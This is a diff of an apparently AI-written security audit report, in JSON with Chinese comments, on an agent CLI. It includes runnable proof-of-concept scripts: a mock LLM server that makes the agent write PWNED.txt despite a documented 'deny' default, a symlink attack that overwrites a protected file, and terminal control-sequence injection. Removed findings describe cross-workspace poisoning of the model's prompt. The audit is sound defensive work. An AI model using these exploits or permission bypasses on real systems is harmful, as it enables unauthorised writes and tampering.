@@ -1,61 +1,99 @@
 {
-  "schema_version": 2,
   "verdict": "FAIL",
   "audited_scopes": [
-    "crates/pony-agent-core/src/agent/skill_body.rs",
-    "crates/pony-agent-core/src/agent/path_permission.rs",
-    "crates/pony-agent-core/src/agent/workspace_hotloader.rs",
-    "crates/pony-agent-core/src/agent/instruction_touch.rs",
+    "crates/pony-agent-core/src/agent/headless.rs",
+    "crates/pony-agent-core/src/bin/cli.rs",
+    "crates/pony-agent-core/src/agent/otel/log.rs",
+    ".dev-team/contract-matrix-wave59-headless.md",
+    ".dev-team/nfr-baseline-wave59.json",
+    ".dev-team/wave59-red-capture.txt",
+    "crates/pony-agent-core/src/agent/governed_executor.rs",
+    "crates/pony-agent-core/src/agent/runtime/types.rs",
+    "crates/pony-agent-core/src/agent/runtime/mod.rs",
+    "crates/pony-agent-core/src/agent/control_plane/mod.rs",
     "crates/pony-agent-core/src/agent/tools.rs",
-    "crates/pony-agent-core/src/agent/context.rs",
-    "crates/pony-agent-core/tests/wave58_skill_parsing.rs",
-    ".dev-team/contract-matrix-wave58.md"
+    "crates/pony-agent-core/src/agent/workspace.rs",
+    "crates/pony-agent-core/tests/headless_contract.rs",
+    "crates/pony-agent-core/tests/cli_acceptance.rs",
+    "tests/acceptance/wave59/headless-cli-e2e.sh"
   ],
-  "reviewer": {
-    "kind": "subagent",
-    "session_id": "l3b-wave58-review-join-b",
-    "fresh_context": true
-  },
-  "executed_by": "l3b-wave58-review-join-b",
-  "reviewed_commit": "9af49dd1dba84aff14f7d28ccede7f77c4daecf8",
-  "attestation": {
-    "self_signed": false
-  },
   "findings": [
     {
-      "file": "crates/pony-agent-core/src/agent/workspace_hotloader.rs",
-      "line": 827,
-      "rule": "LEAK",
-      "counterexample_cmd": "# E1（BLOCKING）跨工作区技能缓存污染：skill_files 键=scope:rank:folder 不含 workspace，快路径只比 mtime+size(841) 不比路径；context.rs:944 把 hotloader 改成进程单例后跨工作区可达 ⇒ B 工作区提示词出现 A 工作区的 description\ncd /tmp/w58b && CARGO_TARGET_DIR=/home/dm/pony-agent/target-test cargo run --offline -q --bin probe2 2>&1 | grep '^\\[E1\\]'\n# 预期 victim=ws-victim/VICTIM-PROJECT-DESC；实测 path=ws-poison/... + victim 提示词段含 POISON=true",
+      "file": "crates/pony-agent-core/src/bin/cli.rs",
+      "line": 894,
+      "rule": "CONTRACT_BREAK",
+      "counterexample_cmd": "# POC-1：默认调用（text、未给 --permission-mode）会**执行** Write 工具；而 --help 声称 (default: deny)\nset -u; B=/home/dm/pony-agent/target/debug/ponycli; T=$(mktemp -d); cd \"$T\"\ncat > m.py <<'EOF'\nimport json\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nARGS = json.dumps({\"path\":\"PWNED.txt\",\"content\":\"x\",\"overwrite\":True,\"description\":\"d\"})\nN = {\"n\":0}\nclass H(BaseHTTPRequestHandler):\n    protocol_version = \"HTTP/1.1\"\n    def log_message(self,*a): pass\n    def do_POST(self):\n        self.rfile.read(int(self.headers.get(\"Content-Length\") or 0)); N[\"n\"] += 1\n        self.send_response(200); self.send_header(\"Content-Type\",\"text/event-stream\")\n        self.send_header(\"Transfer-Encoding\",\"chunked\"); self.end_headers()\n        def chunk(s):\n            b=(\"%s\\n\\n\"%s).encode(); self.wfile.write((\"%X\\r\\n\"%len(b)).encode()+b+b\"\\r\\n\"); self.wfile.flush()\n        chunk(\"data: \"+json.dumps({\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"created\":0,\"model\":\"m\",\"choices\":[{\"index\":0,\"delta\":{\"role\":\"assistant\",\"content\":\"ok\"},\"finish_reason\":None}]}))\n        if N[\"n\"]==1:\n            chunk(\"data: \"+json.dumps({\"id\":\"1\",\"object\":\"chat.completion.chunk\",\"created\":0,\"model\":\"m\",\"choices\":[{\"index\":0,\"delta\":{\"tool_calls\":[{\"index\":0,\"id\":\"c1\",\"type\":\"function\",\"function\":{\"name\":\"Write\",\"arguments\":ARGS}}]},\"finish_reason\":\"tool_calls\"}]}))\n        chunk(\"data: [DONE]\"); self.wfile.write(b\"0\\r\\n\\r\\n\"); self.wfile.flush()\nHTTPServer((\"127.0.0.1\",18591),H).serve_forever()\nEOF\npython3 m.py & MP=$!; sleep 0.6; mkdir -p h/ws\nrun(){ ( cd h/ws && env -u PONYLLM_API_KEY HOME=\"$T/h\" timeout 60 \"$B\" \"$@\" </dev/null ); }\necho \"default(text,no --permission-mode): exit=$(run -p go -g http://127.0.0.1:18591 --key k -m mock-alpha >/dev/null 2>&1; echo $?)\"\necho \"  PWNED: $(find \"$T/h\" -name PWNED.txt | head -1)   <-- 默认档位并未 deny\"\necho \"control(--permission-mode deny): exit=$(run --permission-mode deny -p go -g http://127.0.0.1:18591 --key k -m mock-alpha >/dev/null 2>&1; echo $?)  PWNED_count=$(find \"$T/h\" -name PWNED.txt | wc -l)\"\nkill $MP 2>/dev/null\n\"$B\" --help 2>/dev/null | grep -F -- '--permission-mode'\n# 实测：默认 1 个 PWNED（$HOME/pony_agent/ 下），deny 时 0 个；help 仍打印 (default: deny)\n# 宿主真值源 governed_executor.rs:310-333 只有 auth_mode==\"read_only\" 才拒绝 ⇒ 传 None 等于不受限\n# 代码点 cli.rs:571-578（text 且未显式给档位 ⇒ None）、cli.rs:597-603（只有显式非 read_only 才 WARN）",
       "severity": "BLOCKING"
     },
     {
-      "file": "crates/pony-agent-core/src/agent/skill_body.rs",
-      "line": 139,
+      "file": "crates/pony-agent-core/src/bin/cli.rs",
+      "line": 1159,
       "rule": "CONTRACT_BREAK",
-      "counterexample_cmd": "# E2（ADVISORY，fail-closed）同一 workspace 的符号链接别名 ⇒ 扫描列出但加载拒绝：matches_trust_root(333) 的 canonical 兜底被 139 的词法重判否决，D2/F2-3「列出⇒可加载」在路径别名（symlink/verbatim 前缀/卷大小写）下不成立\ncd /tmp/w58b && CARGO_TARGET_DIR=/home/dm/pony-agent/target-test cargo run --offline -q --bin probe2 2>&1 | grep '^\\[E2\\]'\n# 实测 load(alias ws) => Err(\"skill_out_of_allowed_root\")，而 scan(real) 已列出该技能",
+      "counterexample_cmd": "# POC-2：jsonl 模式 + stdin 是终端 + 不给 -p ⇒ 进 REPL；失败轮次进程仍 exit 0，落盘封套却 exit_code=4\nset -u; B=/home/dm/pony-agent/target/debug/ponycli; T=$(mktemp -d); mkdir -p \"$T/h\"; cd \"$T\"\nDEAD=$(python3 -c 'import socket;s=socket.socket();s.bind((\"127.0.0.1\",0));print(s.getsockname()[1]);s.close()')\nprintf 'hi\\n/exit\\n' | env -u PONYLLM_API_KEY HOME=\"$T/h\" script -qec \"$B --output-format jsonl --result-json $T/r.json -g http://127.0.0.1:$DEAD --key k -m mock-alpha\" /dev/null >/dev/null 2>&1\necho \"process_exit=$?\"\npython3 -c \"import json;d=json.load(open('$T/r.json'));print('envelope status=%s exit_code=%s'%(d['status'],d['exit_code']))\"\n# 实测 process_exit=0、envelope status=failed exit_code=4 ⇒ C2/C3 双破\n# 代码点 cli.rs:1159 丢弃每轮退出码；cli.rs:1163 无条件 finish(Success)",
+      "severity": "BLOCKING"
+    },
+    {
+      "file": "crates/pony-agent-core/src/bin/cli.rs",
+      "line": 724,
+      "rule": "SECURITY",
+      "counterexample_cmd": "# POC-3：--result-json 临时名可预测 + fs::write 跟随符号链接 ⇒ 覆写任意文件\nset -u; B=/home/dm/pony-agent/target/debug/ponycli; D=$(mktemp -d); chmod 777 \"$D\"; mkdir -p \"$D/h\"\nprintf 'ORIGINAL-SECRET\\n' > \"$D/victim.txt\"; chmod 600 \"$D/victim.txt\"\nDEAD=$(python3 -c 'import socket;s=socket.socket();s.bind((\"127.0.0.1\",0));print(s.getsockname()[1]);s.close()')\nenv -u PONYLLM_API_KEY HOME=\"$D/h\" bash -c 'd=$1; B=$2; p=$3\n  ln -s \"$d/victim.txt\" \"$d/.out.json.tmp-$$\"; exec \"$B\" --output-format jsonl --result-json \"$d/out.json\" -p hi -g \"http://127.0.0.1:$p\" --key k -m mock-alpha </dev/null' _ \"$D\" \"$B\" \"$DEAD\" >/dev/null 2>&1\nhead -c 40 \"$D/victim.txt\"; ls -l \"$D/out.json\"; stat -c 'victim_mode=%a' \"$D/victim.txt\"\n# 实测：victim.txt(0600) 被封套覆写；out.json 变成指向 victim.txt 的符号链接；权限回落 0644",
       "severity": "ADVISORY"
     },
     {
-      "file": "crates/pony-agent-core/src/agent/skill_body.rs",
-      "line": 115,
-      "rule": "LEAK",
-      "counterexample_cmd": "# E4（ADVISORY）授权复核(139)排在 metadata/尺寸判定(115-135)之后 ⇒ 越界但名为 SKILL.md 的目标返回 skill_too_large 并回显精确字节数，而非 out_of_allowed_root（信息泄露 + 授权结论依赖文件大小）\ncd /tmp/w58b && CARGO_TARGET_DIR=/home/dm/pony-agent/target-test cargo run --offline -q --bin probe2 2>&1 | grep 'outside big'\n# 实测 project->outside big = skill_too_large \"技能正文 307200 字节\"；对照 project->/etc/shadow = out_of_allowed_root",
+      "file": "crates/pony-agent-core/src/agent/headless.rs",
+      "line": 444,
+      "rule": "SECURITY",
+      "counterexample_cmd": "# strip_ansi 只判 '\\u{1b}'（headless.rs:445），不剥 8-bit CSI U+009B ⇒ 终端控制序列仍可注入\n# 复现：把 POC-1 的 mock 文本换成含 \\u009b 的内容（\"EVIL\\u009b31mRED\"），跑 --output-format jsonl 后：\n#   python3 -c \"raw=open('stdout','rb').read(); print(b'\\xc2\\x9b' in raw, b'\\x1b' in raw)\"   # 实测 True False\n# 实测 delta.text 原样保留 '\\x9b31mRED'（C1 只冻结 0x1b，故属加固缺口，非契约字面违背）",
       "severity": "ADVISORY"
     },
     {
-      "file": "crates/pony-agent-core/src/agent/workspace_hotloader.rs",
-      "line": 199,
+      "file": "crates/pony-agent-core/src/agent/headless.rs",
+      "line": 552,
       "rule": "CONTRACT_BREAK",
-      "counterexample_cmd": "# D2（ADVISORY）omitted 报告无任何生产消费者：omission_markers/SkillScanReport 只在 tests 中出现，semistable 段走 scan_skills_with_budget（丢弃 omitted）⇒ 被跳过技能对模型/用户仍不可观测\ncd /home/dm/pony-agent && grep -rn --include=*.rs 'omission_markers\\|SkillScanReport' crates src-tauri | grep -v '/tests/'\n# 实测仅 workspace_hotloader.rs 自身定义/内部使用，0 处渲染进提示词或 UI",
+      "counterexample_cmd": "# C1 要求 jsonl/sse「每行 JSON 可 serde_json::from_str」，SseSink 却产出 event:/id:/data: 三行帧\nponycli --output-format sse -p hi -g <mock> --key k -m mock-alpha | python3 -c \"import sys;ls=[l for l in sys.stdin.read().split(chr(10)) if l.strip()];print(len(ls), sum(1 for l in ls if not l.startswith('{')))\"\n# 实测 27 行、27 行都不是 JSON 对象；冻结的 E2E 脚本**没有任何 sse 用例** ⇒ sse 形态 stdout 纯净性/退出码零证据",
       "severity": "ADVISORY"
     },
     {
-      "file": "crates/pony-agent-core/src/agent/context.rs",
-      "line": 964,
-      "rule": "LEAK",
-      "counterexample_cmd": "# 信息泄露结论（ADVISORY）：技能清单行 = name [scope]: description（无路径）；omitted skill 标记无路径（可接受）。唯一进入模型可见提示词的绝对路径来自宪法段标题/省略标记（既有行为，F1-1 后锚定会话工作区）\ncd /home/dm/pony-agent && grep -n 'source_path.display()' crates/pony-agent-core/src/agent/workspace_hotloader.rs\n# 1585 为 \"## <heading> (<abs path>)\"，1640 为 \"omitted <abs path>\"；如要求提示词零路径需 Lead 另行裁决",
+      "file": "crates/pony-agent-core/src/agent/headless.rs",
+      "line": 243,
+      "rule": "CONTRACT_BREAK",
+      "counterexample_cmd": "# FromStr 接受 read_only/workspace_write/full_access（与 NFR permission_mode_cli_aliases 同集），但 --help(cli.rs:894) 与错误消息(cli.rs:247 / headless.rs:247) 只列 deny|workspace-write|full-access\nponycli --permission-mode read_only -p hi -g http://127.0.0.1:<dead> --key k </dev/null; echo $?   # 实测 4（≠2）⇒ 别名被接受但文档未写\n# E2E 只覆盖 deny 与 accept-all，别名集从未被黑盒断言",
+      "severity": "ADVISORY"
+    },
+    {
+      "file": "crates/pony-agent-core/src/agent/headless.rs",
+      "line": 193,
+      "rule": "CORRECTNESS",
+      "counterexample_cmd": "# provider 关键词（\"http\"/\"stream\"/\"sse\"/\"connect\"，headless.rs:180-199）分支先于 tool 分支（200-205）\n# ⇒ 文本 \"tool bash failed: http 500\" 归 ProviderNetwork(4) 而非 ToolFailure(5)；宽词表可让任意失败落错档（仍非 0，fail-closed 不破）",
+      "severity": "ADVISORY"
+    },
+    {
+      "file": "crates/pony-agent-core/src/bin/cli.rs",
+      "line": 711,
+      "rule": "NFR_VIOLATION",
+      "counterexample_cmd": "# NFR external_call_timeout_ms=3000 且 external_call_timeout_applies=true，但新 I/O 无任何超时：\n# write_result_envelope(cli.rs:711-731)、flush_events(cli.rs:751-761) 都是无界阻塞写\n# 佐证：grep -n timeout crates/pony-agent-core/src/bin/cli.rs 除 --timeout-secs 外 0 命中\n# ⇒ --result-json 指向挂死的 FUSE/NFS 时进程不可收敛（--timeout-secs 只管 turn，不管封套落盘）",
+      "severity": "ADVISORY"
+    },
+    {
+      "file": "crates/pony-agent-core/src/bin/cli.rs",
+      "line": 259,
+      "rule": "TIMEOUT",
+      "counterexample_cmd": "# --timeout-secs 无上限校验：parse::<u64>() 接受 18446744073709551615；Duration 不溢出、mpsc recv_timeout 也不 panic（rustc 1.91 实测：Instant+Duration 溢出会 panic，但 recv_timeout 走 saturating 路径）\nponycli --output-format jsonl --timeout-secs 18446744073709551615 -p hi -g <slow-mock> --key k -m mock-alpha   # 实测不 panic、永不返回（需外部 timeout 兜底）\n# ⇒ 极大值静默等价于「无界」，与 --help 的 'Bound the turn' 表述不符（非溢出缺陷，缺上限校验）",
       "severity": "ADVISORY"
     }
-  ]
+  ],
+  "reviewed_commit": "9706859",
+  "attestation": {
+    "self_signed": false,
+    "transcribed_verbatim_by_lead": true,
+    "note": "Lead 仅补充机器校验所需元数据；verdict/audited_scopes/findings 为审查者原文，未改写"
+  },
+  "reviewer": {
+    "kind": "subagent",
+    "session_id": "c8ff5b67-9842-4fbb-9790-aa660c54a493",
+    "fresh_context": true,
+    "perspective": "L3-B security/contract"
+  },
+  "executed_by": "c8ff5b67-9842-4fbb-9790-aa660c54a493",
+  "schema_version": 2
 }
